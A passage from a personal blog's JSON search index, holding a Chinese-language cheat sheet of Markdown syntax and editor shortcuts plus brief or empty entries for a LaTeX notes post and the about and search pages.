六级标题 ctrl +1/2/3/4/5/6 快速设置六级标题 CTRL +/- 提升标题等级 倾斜 或者ctrl+i 加粗 或者ctrl+b 斜体加粗 删除线 （两个波浪号） ==高亮== ^上标^ ~下标~ (一个波浪) ==无序列表== +123 +123 +123 +123  123 （1 句点 空格） 123 123   123 （减号 空格） 123 ==升降级别== ctrl+左中括号/右中括号 降级别也可敲tab 123   123 （乘 空格） 123 123  ==表格==（段落\u0026ndash;表格/ctrl+t）    mon tue wed thu fri     123 123 123 123 123    第二行要有横线打几个也行，重要的是要有竖杠和第二行横线 事实上把标题那几个竖杠一打，再敲enter就出来表格 再按左上角那个标志设置表格大小和对其方式即可，右上角还可进行更多表格操作 ==引用==  123  123 123  123（最后一行得空出来不然会加一个同级，空出来不会显示）    大于号加空格 ==分割线==  英文下划线（随便打一些就行） 下划线 或者CTRL+u ==代码== 单行代码 1 2 3  多行代码框 右下角可以选择语言 快捷键ctrl+shift+k   (注意是英文状态下波浪线处的点) 待办事项1  段落\u0026ndash;任务列表 777  行内公式 $sin 2x = 2sinxcosx$ 公式块：段落\u0026ndash;公式块 或者开头结尾两个$ 公式用LaTeX代码编写 超链接 链接位置为本文文档标题时，必须有井号，其他不需要 按ctrl同时点击即可打开，快捷键ctrl+k 六级标题 bilibili 文件\u0026ndash;偏好设置\u0026ndash;导出，可以导出为pdfword等多种格式   这里是注释，方括号+尖角+序号（其实啥也行匹配就可），下面写注释时同理后面再加个冒号 \u0026#x21a9;\u0026#xfe0e;   ","permalink":"https://WnQinm.github.io/2022/08/markdown_help/","tags":["markdown"],"title":"Markdown语法简介"},{"categories":["Math"],"contents":"由于本人技术原因，latex在html界面的渲染做的很差，有的可以正常显示有的则不行，本篇主要是帮助回忆latex数学公式相关语法，故而就此作罢 ==双反斜杠换行==    ","permalink":"https://WnQinm.github.io/2022/08/latex%E6%95%B0%E5%AD%A6%E5%85%AC%E5%BC%8F/","tags":["latex","math"],"title":"Latex数学公式"},{"categories":null,"contents":"","permalink":"https://WnQinm.github.io/about/","tags":null,"title":"关于 清梦"},{"categories":null,"contents":"","permalink":"https://WnQinm.github.io/search/","tags":null,"title":"Search"}]